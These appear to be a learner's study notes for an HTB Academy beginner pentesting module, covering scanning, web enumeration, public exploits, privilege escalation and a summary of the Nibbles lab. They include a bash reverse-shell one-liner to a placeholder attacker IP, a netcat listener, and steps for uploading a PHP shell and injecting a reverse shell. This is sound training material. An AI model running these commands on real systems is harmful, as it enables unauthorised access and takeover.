# 02 — Getting Started

> **Path Phase:** Introduction | **Difficulty:** Fundamental | **Sections:** 23

The most important foundational module — a complete beginner-friendly attack workflow (enumerate → find service → exploit → get shell → privilege escalate), finishing with the Nibbles machine and a Knowledge Check.

> ℹ️ `{TARGET}` = your spawned box IP. Flags withheld per HTB Academy policy.

---

## Table of Contents
1. Infosec Overview
2. Getting Started with a Pentest Distro
3. Staying Organized
4. Connecting Using VPN
5. Common Terms
6. Basic Tools
7. Service Scanning
8. Web Enumeration
9. Public Exploits
10. Types of Shells
11. Privilege Escalation
12. Transferring Files
13. Starting Out
14. Navigating HTB
15. Nibbles - Enumeration
16. Nibbles - Web Footprinting
17. Nibbles - Initial Foothold
18. Nibbles - Privilege Escalation
19. Nibbles - Alternate User Method - Metasploit
20. Common Pitfalls
21. Getting Help
22. Next Steps
23. Knowledge Check

---

## 1–5 — Overview, Distro, Organization, VPN, Common Terms
InfoSec CIA triad (Confidentiality, Integrity, Availability), pentest distros (Parrot/Kali), note-taking, and connecting to labs.

```bash
sudo openvpn user.ovpn
ip a show tun0
```

## 6 — Basic Tools
```bash
ssh user@{TARGET}
nc -nv {TARGET} <port>
```

## 7 — Service Scanning
```bash
nmap -sV -sC -p- {TARGET}
smbclient -N -L //{TARGET}
```

## 8 — Web Enumeration
```bash
gobuster dir -u http://{TARGET} -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
whatweb {TARGET}
curl http://{TARGET}/robots.txt
```

## 9 — Public Exploits
```bash
searchsploit <service> <version>
searchsploit -m <exploit-id>
```

## 10 — Types of Shells
```bash
# Listener:
nc -lvnp 4444
# Reverse shell (target):
bash -c 'bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1'
# TTY upgrade:
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## 11 — Privilege Escalation
```bash
sudo -l
find / -perm -4000 2>/dev/null
./linpeas.sh
```
Check GTFOBins for any sudo/SUID binary.

## 12 — Transferring Files
```bash
python3 -m http.server 8000
wget http://<YOUR_IP>:8000/linpeas.sh
```

## 15–19 — Nibbles Machine
- **Enum:** `nmap -sV -sC -p- {TARGET}` → SSH(22) + Apache(80)
- **Web:** source comment reveals `/nibbleblog/` → `searchsploit nibbleblog` (4.0.3, CVE-2015-6967)
- **Foothold:** admin login → upload PHP shell via plugin → trigger → catch shell
- **PrivEsc:** `sudo -l` shows NOPASSWD script → inject reverse shell → run as root
- **Alt (MSF):** `exploit/multi/http/nibbleblog_file_upload`
> **Nibbles user + root:** ✅ Completed in lab (flags withheld per HTB Academy policy)

## 23 — Knowledge Check
```bash
nmap -sV -sC -p- {TARGET}
gobuster dir -u http://{TARGET} -w <wordlist>
searchsploit <found-service>
# exploit → shell → sudo -l / SUID → root
```
> **Knowledge Check:** ✅ Completed in lab (flag withheld per HTB Academy policy)

---

## 🧰 Tools Used
| Tool | Purpose |
|------|---------|
| `nmap` | Service scanning |
| `gobuster` / `whatweb` | Web enumeration |
| `searchsploit` | Public exploits |
| `netcat` | Reverse shells |
| `linpeas` | Privesc enumeration |

## 🔑 Key Takeaways
- This module is the **entire methodology in miniature** — enumerate → exploit → escalate.
- `sudo -l` and SUID checks are the fastest privesc wins.
- Always upgrade your shell to a full TTY early.
- GTFOBins is your best friend for privesc.

---

*Part of my HTB CPTS Portfolio — Zeshan Ali*
